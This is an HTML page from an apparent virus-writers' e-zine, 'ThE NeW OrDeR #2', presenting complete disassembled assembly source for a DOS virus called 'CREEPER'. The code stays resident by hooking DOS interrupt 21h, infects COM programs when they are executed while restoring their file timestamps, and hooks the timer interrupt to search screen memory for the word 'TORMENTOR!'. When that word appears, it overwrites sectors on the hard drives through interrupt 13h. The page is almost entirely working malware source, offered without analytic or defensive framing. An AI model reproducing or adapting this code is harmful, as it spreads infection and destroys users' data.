<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>CREEPER</strong></font></p>

<p align="left"><font color="#00FFFF"><strong>;
--------------------------------------------------------------------------<br>
; Disassembled by FairWind / NRG , nrgteam@mail.ru<br>
;
--------------------------------------------------------------------------</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>code segment byte
public<br>
assume cs:code, ds:code, es:code, ss:code<br>
<br>
<br>
org 100h<br>
<br>
<br>
codebeg:<br>
<br>
<br>
mov ax,043FFh<br>
int 21h<br>
mov ax,ds<br>
sub ax,11h<br>
mov ds,ax<br>
cmp byte ptr ds:[0100h],5Ah<br>
jnz skip<br>
mov ax,ds:[0103h]<br>
sub ax,40h<br>
jb skip<br>
mov ds:[0103h],ax<br>
sub word ptr ds:[0112h],50h<br>
mov es,ds:[0112h]<br>
push cs<br>
pop ds<br>
mov cx,code_end-codebeg<br>
mov di,100h<br>
push di<br>
mov si,di<br>
rep movsb<br>
<br>
push es<br>
pop ds<br>
<br>
mov ax,351Ch<br>
int 21h<br>
mov word ptr ds:[int1Cret],bx<br>
mov word ptr ds:[int1Cret+2],es<br>
mov al,21h<br>
int 21h<br>
mov word ptr ds:[real21+1],bx<br>
mov word ptr ds:[real21+3],es<br>
<br>
mov ah,25h<br>
mov dx,offset int21beg<br>
int 21h<br>
mov al,1Ch<br>
mov dx,offset int1Cnew<br>
int 21h<br>
<br>
push cs<br>
push cs<br>
pop es<br>
pop ds<br>
<br>
ret<br>
<br>
skip: int 20h<br>
<br>
<br>
int21beg: push ax<br>
sub ax,4B00h<br>
jz infect<br>
pop ax<br>
cmp ax,043FFh<br>
jne real21<br>
<br>
mov ax,word ptr ds:[retdata]<br>
mov si,ax<br>
mov di,100h<br>
mov cx,code_end-codebeg<br>
rep movsb<br>
<br>
mov ax,100h<br>
<br>
pop cx<br>
pop cx<br>
push es<br>
push ax<br>
iret<br>
<br>
real21: db 0EAh, 00h, 00h, 00h, 00h<br>
<br>
<br>
retdata: db 00h, 00h<br>
<br>
f_time: dw 0000h<br>
<br>
f_date: dw 0000h<br>
<br>
infect: pop ax<br>
<br>
push ax<br>
push bx<br>
push cx<br>
push di<br>
push ds<br>
push dx<br>
push si<br>
<br>
<br>
mov ah,43h<br>
int 21h<br>
mov ax,4301h<br>
and cx,0FEh<br>
int 21h<br>
<br>
mov ax,3D02h<br>
int 21h<br>
<br>
xchg ax,bx<br>
<br>
call sub_2<br>
<br>
sub_2: mov di,sp<br>
mov si,ss:[di]<br>
inc sp<br>
inc sp<br>
<br>
push cs<br>
pop ds<br>
<br>
mov ax,5700h<br>
int 21h<br>
mov [si-(sub_2-f_time)],cx<br>
mov [si-(sub_2-f_date)],dx<br>
<br>
mov ah,3Fh<br>
mov cx,code_end-codebeg<br>
add si,code_end-sub_2<br>
mov dx,si<br>
int 21h<br>
<br>
<br>
cmp word ptr [si],'MZ'<br>
je close<br>
cmp word ptr [si],'ZM'<br>
je close<br>
mark: cmp word ptr [si+(mark-codebeg+4)],'YD'<br>
je close<br>
<br>
call put_eof<br>
<br>
cmp ax,(0FFFFh-(code_end-codebeg)-100h)<br>
ja close<br>
cmp ax,code_end-codebeg+100h<br>
jb close<br>
<br>
add ax,100h<br>
mov word ptr ds:[si-(code_end-retdata)],ax<br>
<br>
mov ah,40h<br>
mov cx,code_end-codebeg<br>
mov dx,si<br>
int 21h<br>
<br>
mov ax,4200h<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h<br>
<br>
mov ah,40h<br>
mov cx,code_end-codebeg<br>
mov dx,si<br>
sub dx,cx<br>
int 21h<br>
<br>
close: mov ax,5701h<br>
mov cx,[si-(code_end-f_time)]<br>
mov dx,[si-(code_end-f_date)]<br>
int 21h<br>
<br>
mov ah,3Eh<br>
int 21h<br>
pop si<br>
pop dx<br>
pop ds<br>
pop di<br>
pop cx<br>
pop bx<br>
pop ax<br>
<br>
<br>
jmp real21<br>
<br>
put_eof: mov ax,4202h<br>
xor dx,dx<br>
xor cx,cx<br>
int 21h<br>
ret<br>
<br>
<br>
int1Cnew:<br>
<br>
push ax<br>
inc byte ptr cs:[counter]<br>
mov al,30h<br>
cmp byte ptr cs:[counter],al<br>
jz scan<br>
pop ax<br>
<br>
<br>
slut: jmp dword ptr cs:[int1Cret]<br>
<br>
scan:<br>
push bx<br>
push cx<br>
push di<br>
push ds<br>
push dx<br>
push es<br>
push si<br>
<br>
<br>
push cs<br>
pop ds<br>
<br>
cld<br>
xor bx,bx<br>
mov byte ptr cs:[counter],bh<br>
mov cx,0FA0h<br>
<br>
mov ax,0b800h<br>
mov es,ax<br>
xor di,di<br>
<br>
again: mov al,byte ptr cs:[text+bx]<br>
sub al,80h<br>
repnz scasb<br>
jnz stick<br>
<br>
maybe: inc di<br>
inc bx<br>
cmp bx,10d<br>
jz beep<br>
<br>
mov al,byte ptr cs:[text+bx]<br>
sub al,80h<br>
scasb<br>
jz maybe<br>
xor bx,bx<br>
jmp again<br>
<br>
beep:<br>
xor cx,cx<br>
mov bx,word ptr cs:[int1Cret]<br>
mov es,word ptr cs:[int1Cret+2]<br>
mov ax,251Ch<br>
int 21h<br>
<br>
overagain: mov dx,0180h<br>
xor bx,bx<br>
<br>
reset: mov ah,00h<br>
inc bx<br>
cmp bl,5h<br>
jz raise<br>
inc cx<br>
int 13h<br>
<br>
hoho: mov ax,0380h<br>
inc cx<br>
int 13h<br>
jc reset<br>
jmp hoho<br>
<br>
raise: xor cx,cx<br>
xor bx,bx<br>
inc dx<br>
cmp dl,85h<br>
jnz hoho<br>
jmp overagain<br>
<br>
stick:<br>
pop si<br>
pop es<br>
pop dx<br>
pop ds<br>
pop di<br>
pop cx<br>
pop bx<br>
pop ax<br>
<br>
<br>
jmp slut<br>
<br>
<br>
counter: db 00h<br>
<br>
text: db 'T'+80h, 'O'+80h, 'R'+80h, 'M'+80h, 'E'+80h, 'N'+80h<br>
db 'T'+80h, 'O'+80h, 'R'+80h, '!'+80h<br>
</strong></font><font color="#FFFFFF"><strong><br>
int1Cret: db 0EAh, 00h, 00h, 00h, 00h<br>
<br>
code_end: ; THE END.<br>
<br>
code ends<br>
end codebeg</strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
